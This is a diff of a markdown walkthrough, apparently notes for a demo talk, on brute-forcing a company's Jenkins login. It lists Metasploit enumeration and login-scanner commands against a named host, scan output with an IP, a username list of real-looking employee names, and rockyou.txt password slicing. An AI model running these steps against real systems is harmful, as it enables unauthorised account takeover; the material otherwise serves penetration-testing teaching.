@@ -1,36 +1,4 @@
-# Bruteforce Jenkins Login
-This section aims to login to the company's Jenkins instance.
-To do so, we'll prepare a list of usernames and check login with rockyou list.
-Before login can be bruteforced, the login URL must be identified via BurpSuite.
-
-## Enum Module
-Let's get some details of Jenkins
-
-```bash
-msfconsole
-
-use auxiliary/scanner/http/jenkins_enum
-set RHOSTS jenkins.test.nevervictimconsult.xyz
-set RPORT 8080
-set TARGETURI /
-exploit
-```
-We detect that theres a pretty modern version of Jenkins running.
-```bash
-[+] 34.159.77.191:8080    - Jenkins Version 2.387.3
-[*] /script restricted (403)
-[*] /view/All/newJob restricted (403)
-[*] /asynchPeople/ restricted (403)
-[*] /systemInfo restricted (403)
-```
-There are no easy-to-use exploits available for this version
-```bash
-searchsploit Jenkins 2.3
-```
-So there are at least two options left:
-* attack the host
-* get access to Jenkins
-
+# Jenkins Bruteforce Login
 Getting access via Social Engineering or Passwordcracking is the first attempt.
 
 ## Prepare Usernamelist
@@ -45,10 +13,10 @@ nano user.txt
 put the names into nano.
 Dont take all names to not break too much bruteforce into
 ```
+Jeffrey van der Linden
 Kay Meyer
 Robert Bartsch
 Ricardo Pope
-Jeffrey van der Linden
 ```
 
 ```bash
@@ -67,7 +35,6 @@ Rockyou.txt is a set of compromised passwords from the social media application 
 cd /root/demotalk/jenkinsBrute/
 sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
 ```
-
 
 ## Login Scan Module
 If we want to access Jenkins as a user, we need to find a bit more information of login options.
@@ -93,6 +60,8 @@ set RPORT 8080
 set USER_FILE /root/demotalk/jenkinsBrute/userlist.txt
 set PASS_FILE /root/demotalk/jenkinsBrute/passwordlist.txt
 set LOGIN_URL j_spring_security_check
+set STOP_ON_SUCCESS true
+
 exploit
 ```
 There will be two successful attempts
